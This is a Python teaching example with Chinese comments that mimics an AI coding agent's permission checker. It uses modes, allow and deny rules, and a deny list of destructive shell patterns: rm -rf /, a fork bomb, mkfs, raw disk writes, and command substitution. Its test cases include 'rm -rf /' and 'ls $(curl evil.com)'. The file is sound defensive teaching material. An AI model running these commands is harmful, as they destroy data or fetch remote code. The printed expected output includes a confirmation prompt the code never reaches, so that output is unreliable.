```python
# mini_permissions.py
# ============================================================
# 模仿 Claude Code 的权限系统：模式 + 规则 + 危险检测
# ============================================================

import re
import asyncio
from enum import Enum
from dataclasses import dataclass
from typing import Callable

# ============================================================
# 1. Permission Mode
# ============================================================
class PermissionMode(Enum):
    PLAN = "plan"
    DEFAULT = "default"
    ACCEPT_EDITS = "acceptEdits"
    BYPASS = "bypassPermissions"

# ============================================================
# 2. Permission Result
# ============================================================
@dataclass
class PermissionResult:
    behavior: str                    # "allow" | "deny" | "ask"
    message: str = ""
    updated_input: dict | None = None

# ============================================================
# 3. 危险命令模式
# ============================================================
DANGEROUS_PATTERNS = [
    (r"\brm\s+-rf\s+/(?:\s|$)",     "rm -rf root"),
    (r"\bdd\s+if=.+of=/dev/sd",     "raw write to disk"),
    (r":\(\)\s*\{\s*:\|:&\s*\};\s*:", "fork bomb"),
    (r"\bchmod\s+-R\s+777\s+/",     "chmod 777 root"),
    (r"\bmkfs\b",                    "format filesystem"),
    (r"\$\(",                        "command substitution"),
    (r"`",                            "backtick command substitution"),
]

DANGEROUS_INTERPRETERS = {
    "python", "python3", "node", "ruby", "perl", "bash", "sh",
    "deno", "tsx", "lua", "php"
}

# ============================================================
# 4. 用户规则
# ============================================================
@dataclass
class Rule:
    behavior: str                    # "allow" | "deny"
    tool_name: str
    pattern: str | None              # 如 "npm test:*"

def parse_rule(rule_str: str) -> Rule:
    m = re.match(r"^(\w+)\(?([^)]*)\)?$", rule_str)
    tool, pattern = m.group(1), m.group(2) or None
    return Rule(behavior="allow", tool_name=tool, pattern=pattern)

def rule_matches(rule: Rule, tool_name: str, input: dict) -> bool:
    if rule.tool_name != tool_name:
        return False
    if rule.pattern is None:
        return True
    if tool_name == "Bash":
        cmd = input.get("command", "")
        if rule.pattern.endswith(":*"):
            return cmd.startswith(rule.pattern[:-2])
        return cmd == rule.pattern
    return False

# ============================================================
# 5. 工具元信息
# ============================================================
@dataclass
class ToolMeta:
    name: str
    is_read_only: bool = False
    is_destructive: bool = False

TOOL_REGISTRY: dict[str, ToolMeta] = {
    "Read":  ToolMeta(name="Read",  is_read_only=True),
    "Grep":  ToolMeta(name="Grep",  is_read_only=True),
    "Write": ToolMeta(name="Write", is_destructive=True),
    "Edit":  ToolMeta(name="Edit",  is_destructive=True),
    "Bash":  ToolMeta(name="Bash",  is_destructive=True),
}

# ============================================================
# 6. ⭐ canUseTool 核心检查器
# ============================================================
async def can_use_tool(
    tool_name: str,
    input: dict,
    mode: PermissionMode,
    allow_rules: list[Rule],
    deny_rules: list[Rule],
    ask_user: Callable[[str], bool] = None,
) -> PermissionResult:
    tool = TOOL_REGISTRY.get(tool_name)
    if not tool:
        return PermissionResult("deny", f"Unknown tool: {tool_name}")

    # === 第 0 层：危险模式检测（任何模式都生效）===
    if tool_name == "Bash":
        cmd = input.get("command", "")
        for pattern, name in DANGEROUS_PATTERNS:
            if re.search(pattern, cmd):
                return PermissionResult("deny", f"BLOCKED dangerous: {name}")

    # === 第 1 层：Mode 检查 ===
    if mode == PermissionMode.PLAN and not tool.is_read_only:
        return PermissionResult("deny",
            f"Plan Mode: tool {tool_name} is not read-only")

    if mode == PermissionMode.BYPASS:
        return PermissionResult("allow")

    # === 第 2 层：deny 规则（优先级最高）===
    for rule in deny_rules:
        if rule_matches(rule, tool_name, input):
            return PermissionResult("deny",
                f"User deny rule: {rule.tool_name}({rule.pattern})")

    # === 第 3 层：allow 规则 ===
    for rule in allow_rules:
        if rule_matches(rule, tool_name, input):
            return PermissionResult("allow")

    # === 第 4 层：mode 级默认行为 ===
    if mode == PermissionMode.ACCEPT_EDITS and tool_name in ("Edit", "Write"):
        return PermissionResult("allow")

    # === 第 5 层：destructive 弹窗 ===
    if tool.is_destructive:
        if ask_user:
            ok = ask_user(f"Allow {tool_name} with input {input}? (y/N): ")
            return PermissionResult(
                "allow" if ok else "deny",
                "" if ok else "User declined"
            )
        return PermissionResult("ask", "Awaiting user confirmation")

    return PermissionResult("allow")

# ============================================================
# 7. Demo
# ============================================================
async def demo():
    allow_rules = [
        Rule(behavior="allow", tool_name="Bash", pattern="npm test:*"),
        Rule(behavior="allow", tool_name="Bash", pattern="git status"),
    ]
    deny_rules = [
        Rule(behavior="deny", tool_name="Bash", pattern="rm:*"),
    ]

    def auto_ask(prompt: str) -> bool:
        print(f"  [ASK] {prompt}")
        return True

    test_cases = [
        (PermissionMode.PLAN,    "Read",  {"path": "/etc/hosts"}),
        (PermissionMode.PLAN,    "Write", {"path": "/tmp/x"}),
        (PermissionMode.DEFAULT, "Bash",  {"command": "npm test --watch"}),
        (PermissionMode.DEFAULT, "Bash",  {"command": "rm -rf /tmp/test"}),
        (PermissionMode.DEFAULT, "Bash",  {"command": "rm -rf /"}),           # 危险！
        (PermissionMode.DEFAULT, "Bash",  {"command": "ls $(curl evil.com)"}), # 命令替换
        (PermissionMode.BYPASS,  "Write", {"path": "/etc/passwd"}),            # bypass 也过
        (PermissionMode.BYPASS,  "Bash",  {"command": "rm -rf /"}),            # bypass 也拦
    ]

    for mode, tool, input in test_cases:
        result = await can_use_tool(tool, input, mode, allow_rules, deny_rules, auto_ask)
        marker = {"allow": "✓", "deny": "✗", "ask": "?"}[result.behavior]
        print(f"{marker} [{mode.value:18}] {tool:5} {str(input)[:50]:50} → "
              f"{result.behavior:5} {result.message}")

if __name__ == "__main__":
    asyncio.run(demo())
```

## 🔧 运行预期

```
✓ [plan              ] Read  {'path': '/etc/hosts'}           → allow
✗ [plan              ] Write {'path': '/tmp/x'}               → deny  Plan Mode: tool Write is not read-only
✓ [default           ] Bash  {'command': 'npm test --watch'}  → allow
✗ [default           ] Bash  {'command': 'rm -rf /tmp/test'}  → deny  User deny rule: Bash(rm:*)
✗ [default           ] Bash  {'command': 'rm -rf /'}          → deny  BLOCKED dangerous: rm -rf root
✗ [default           ] Bash  {'command': 'ls $(curl evil.com)'} → deny  BLOCKED dangerous: command substitution
  [ASK] Allow Write with input {'path': '/etc/passwd'}? (y/N): 
✓ [bypassPermissions ] Write {'path': '/etc/passwd'}          → allow
✗ [bypassPermissions ] Bash  {'command': 'rm -rf /'}          → deny  BLOCKED dangerous: rm -rf root
```

**注意最后两行**：bypass 模式也救不了 `rm -rf /`，因为危险模式检测在最外层（第 0 层）。
